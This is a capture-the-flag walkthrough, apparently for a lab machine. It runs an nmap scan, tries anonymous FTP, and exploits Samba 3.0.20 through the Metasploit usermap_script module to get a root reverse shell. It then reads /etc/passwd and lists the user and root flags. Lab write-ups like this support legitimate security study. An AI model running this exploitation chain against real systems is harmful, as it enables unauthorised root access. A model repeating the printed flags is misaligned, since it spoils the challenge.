@@ -1,0 +1,47 @@
+We start with our Nmap scan:sudo nmap -sC -sV -p- --min-rate 5000 (target ip).
+
+We find multiple open tcp ports: 21,22,139,445, and 3632. 
+
+We notice that port 21 is a ftp port with anonymous login. This means that if we provided the username as "Anonymous" and any password, we will be in.
+
+So, we will do:ftp (target ip).
+
+There is nothing in the server.
+
+We need to search for another exploit. We know that Samba 3.0.20-Debian is running on the port 445.
+
+We will search for exploits for this server: search sploit Samba 3.0.20-Debian. We will get multiple results but we are interested in:Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit).
+
+We will run Metasploit to exploit this version of Samba.
+
+After launching Metasploit, we will again search for the same version of Samba so we know what we are going to use: search Samba 3.0.20.
+
+We will get the name of the exploit that we are going to use: exploit/multi/samba/usermap_script.
+
+Next, we will do: use exploit/multi/samba/usermap_script.
+
+We will set the RHOST which is the ip of the target machine and also need to set LHOST which is our ip.
+
+set RHOST (ip target machine)
+
+set LHOST ( our ip).
+
+then, we simply do: exploit.
+
+This will give us a reverse shell as root. 
+
+However, what we get is a dumb shell. To get a more functional shell we do: shell.
+
+Now that we have a functional shell, we can list the users so we can get the user flag. We can list the users by: cat /etc/passwd. This will give us the username of makis. 
+
+We can get the user flag from: /home/makis/user.txt
+
+user flag: 14cd1b3b16964a1d1b36d38d880b6f02.
+
+We can get the root flag from: /root/root.txt
+
+root flag: e7f28f06795766dadb764740271015b5.
+
+//END
+
+
